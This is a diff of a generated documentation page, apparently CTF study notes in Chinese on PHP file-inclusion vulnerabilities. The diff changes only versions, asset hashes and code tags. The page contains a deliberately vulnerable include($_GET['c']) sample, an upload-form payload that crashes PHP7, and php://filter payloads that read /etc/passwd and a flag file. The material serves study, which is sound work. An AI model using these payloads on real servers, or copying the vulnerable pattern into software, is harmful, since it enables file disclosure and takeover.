@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -2990,18 +2990,18 @@
                   <h1>Php文件包含</h1>
                 
                 <h2 id="_1">常用重要文件<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>/etc/apache2/apache2.conf
+<div class="codehilite"><pre><span></span><code>/etc/apache2/apache2.conf
 /etc/apache2/sites-enabled/000-default.conf
 /var/log/apache2/error.log
-</pre></div>
+</code></pre></div>
 
 <h2 id="_files">_FILES数组<a class="headerlink" href="#_files" title="Permanent link">&para;</a></h2>
 <p>$_FILES 数组提供了多个内容在文件上传时使用，比较重要的有以下几个：
-<div class="codehilite"><pre><span></span><span class="x">$_FILES[&#39;myFile&#39;][&#39;name&#39;]// 客户端文件的原名称。 </span>
+<div class="codehilite"><pre><span></span><code><span class="x">$_FILES[&#39;myFile&#39;][&#39;name&#39;]// 客户端文件的原名称。 </span>
 <span class="x">$_FILES[&#39;myFile&#39;][&#39;type&#39;]// 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span>
 <span class="x">$_FILES[&#39;myFile&#39;][&#39;size&#39;] //已上传文件的大小，单位为字节。 </span>
 <span class="x">$_FILES[&#39;myFile&#39;][&#39;tmp_name&#39;] //文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span>
-</pre></div>
+</code></pre></div>
 上传过程中还利用到了一个重要的函数  <code>move_uploaded_file()</code>，该方法是将上传的文件移动到新位置，若不加上这一行代码，临时文件在上传周期后就被删除而不会被存储。</p>
 <p>move_uploaded_file(file,newloc)</p>
 <h2 id="_2">文件包含漏洞<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
@@ -3018,12 +3018,12 @@
 <p>这个函数跟require的区别 跟上面我所讲的include和include_once是一样的。所以我就不重复了</p>
 <h3 id="_4">文件包含爆栈&amp;上传<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>漏洞样例
-<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
     <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
 <span class="cp">?&gt;</span><span class="x"></span>
-</pre></div>
+</code></pre></div>
 payload
-<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
     <span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;upload&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;./self_include.php?c=self_include.php&quot;</span><span class="p">&gt;</span>
@@ -3032,7 +3032,7 @@ payload
     <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</pre></div>
+</code></pre></div>
 PHP7中如果include(‘php://filter/string.strip_tags/resource=/etc/passwd’)，就会引起PHP程序直接崩溃</p>
 <h4 id="getshell">文件包含getshell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h4>
 <p>利用bp发包
@@ -3066,8 +3066,8 @@ php对post过来的文件有一个默认处理流程，即在一个处理周期�
 <h2 id="php">php伪协议<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
 <p><a href="https://lorexxar.cn/2016/09/14/php-wei/">https://lorexxar.cn/2016/09/14/php-wei/</a>
 读取../flag.php
-<div class="codehilite"><pre><span></span>module=php://filter/read=convert.base64-encode/resource/../flag&amp;name=php
-</pre></div></p>
+<div class="codehilite"><pre><span></span><code>module=php://filter/read=convert.base64-encode/resource/../flag&amp;name=php
+</code></pre></div></p>
                 
                   
                 
@@ -3167,7 +3167,7 @@ php对post过来的文件有一个默认处理流程，即在一个处理周期�
       
     </div>
     
-      <script src="../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
